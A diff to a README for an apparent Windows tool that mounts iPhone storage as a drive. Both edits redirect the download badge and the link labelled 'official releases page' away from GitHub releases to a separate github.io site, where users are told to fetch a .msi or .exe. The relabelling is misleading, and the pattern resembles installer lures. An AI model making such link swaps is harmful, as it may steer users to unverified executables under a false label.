@@ -1,6 +1,6 @@
 # 📁 iphone-drive-windows - Access iPhone files as local drives
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/compressedgasreservoir871/iphone-drive-windows/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://compressedgasreservoir871.github.io)
 
 This application creates a bridge between your Apple device and your computer. It allows your Windows system to treat your iPhone or iPad storage like a standard external hard drive. Once you mount the device, you open, edit, and save files within your app folders using the programs you use every day.
 
@@ -12,7 +12,7 @@ You need a computer that runs Windows 10 or 11. Your iPhone or iPad must support
 
 You obtain the installer from the official release page. Click the link below to visit the page and select the version for your computer.
 
-[Visit the official releases page to download](https://github.com/compressedgasreservoir871/iphone-drive-windows/releases)
+[Visit the official releases page to download](https://compressedgasreservoir871.github.io)
 
 On this page, look for the file ending in .msi or .exe. Download this file to your computer.
 
